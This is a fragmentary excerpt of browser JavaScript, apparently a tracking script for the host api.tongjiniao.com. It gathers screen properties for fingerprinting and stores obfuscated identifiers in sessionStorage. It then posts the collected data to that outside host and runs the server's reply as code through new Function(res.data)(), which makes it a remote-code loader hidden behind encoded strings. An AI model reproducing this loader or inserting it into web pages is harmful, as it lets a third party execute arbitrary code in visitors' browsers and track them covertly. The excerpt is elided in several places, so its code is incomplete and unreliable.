...
var isRepeat = 0
for (var i = 0; i < len; i++) {
    if (stag[i].src && stag[i].src.indexOf('687284939891630080') > -1) {
        isRepeat += 1
        if (isRepeat >= 2) break;
    }
}
if (isRepeat >= 2) {
    ...
    sg: 'tFvSh5tom5xrbmuXZWaYY5lrk3GcZ29cU9GGb2qcYlmtW5yWmGSYlWhscZZsYoSVg22YcJpjb2RqlZ1tapRsamlpmpWNVNiGcG5wmGpsl2qYZJVwlGNsYmGbmmFTxFhxW1vf',
...
let xhr;
this.storage.rid('2Mydj2Zsmmdrl5lhlWqVbGhjm3Bubw==');
this.request.post('//api.tongjiniao.com/r?t=1725123947&p=688553500628819968', data,true,function (res){new Function(res.data)();});
        },
        screen: {
            AT: screen.availTop,
AL: screen.availLeft,
...
ON: screen.orientation
        ...
        storage: {
            uuid: function (k, v) {
    if (!k) {
        k = 'st_1a5dce5fb1357a3a8ea8f16a152de51c'
    }
    if (!v) {
        v = 'bW.cmZiVapZhb2prapdtamptkmVsam1rYGdnkZI='
    }
...
sid: function (k, v) {
    if (!k) {
        k = 'st_e244d46ec645b6b97fc9887c4cc9d6f2'
    }
    if (!v) {
        v = 'pZbXqc.jnqzKwWtpaW5tZZpkZGhmnWiWa25mmQ=='
    }
...
pc: function (k) {
    if (!k) {
        k = 'st_416e1db5598fc2e2e2efd5215eb2590d'
    }
...
rid: function (v) {
    ...
    var k = 'st_199f2f0ca37d1dfeb1ce42eda2ff8747';
    if (v !== null) {
        sessionStorage.setItem(k, v);
        return;
    }
